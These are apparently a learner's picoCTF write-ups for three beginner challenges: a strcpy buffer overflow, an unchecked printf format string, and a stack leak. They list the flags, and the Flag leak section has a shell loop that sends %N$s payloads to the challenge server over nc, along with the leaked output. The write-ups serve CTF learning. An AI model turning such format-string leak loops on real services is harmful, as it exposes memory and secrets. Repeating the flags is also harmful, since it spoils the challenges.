buffer overflow 0

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}`

We know it's a buffer overflow, so typing long enough strings _should_ work.
And it does ! but why ?

All you really need to look at is here:

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

The `sigsegv_handler` function is called when a segmentation fault occurs. A bit of googling reveals that
it the ``strcpy`` can cause the sigsev (writing outta bounds). So we just input a string b/w (16,100) and make it overflow.

# format string 0

**Flag:** `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}`

Didn't even download the binary - reading the title, you can assume that
they _will_ be having raw printfs() without format strings. Choose the options that have a fstring embedded within them
and you get the flag. The segfault is due to trying to parse non string bytes as bytes, of course.

# Flag leak

**Flag** `picCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}`

again, easily assume it is an fstrings issue, again.

After verifing with %s, I started smashing %s in hopes that I could leak the stack directly.
This obviously didn't work

After some talking with chatgpt, I learned about stack offsets and cooked up a small script myself to attack the stack -
```zsh
for i in {1..29}; do echo %"$i"\$s | nc saturn.picoctf.net 53300
done
```
which gave me
```
Tell me a story and then I'll tell you one >> Here's a story -
CTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}
```

missed the pico part as it probably wasn't properly aligned. What do you do if part of the flag was stuck there ?

No real clue, but $i%x is probably the way, if I had to guess.
